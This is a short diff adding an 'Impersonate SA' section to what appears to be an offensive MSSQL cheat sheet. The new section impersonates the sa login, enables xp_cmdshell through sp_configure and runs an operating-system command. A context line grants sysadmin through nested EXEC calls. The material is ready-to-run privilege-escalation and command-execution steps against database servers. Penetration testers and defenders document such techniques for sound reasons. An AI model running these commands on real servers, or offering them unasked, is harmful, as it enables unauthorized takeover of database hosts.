@@ -192,6 +192,17 @@ SQL> EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''sadmin'''',''''sysadmin'''''') 
 
 ### xp_cmdshell
 
+#### Impersonate SA
+
+```c
+SQL> EXECUTE AS LOGIN = 'sa';
+SQL> EXEC sp_configure 'Show Advanced Options', 1; 
+SQL> RECONFIGURE; 
+SQL> EXEC sp_configure 'xp_cmdshell', 1; 
+SQL> RECONFIGURE;
+SQL> EXEC xp_cmdshell 'dir';
+```
+
 #### Execute Script HTTP Server
 
 ```c
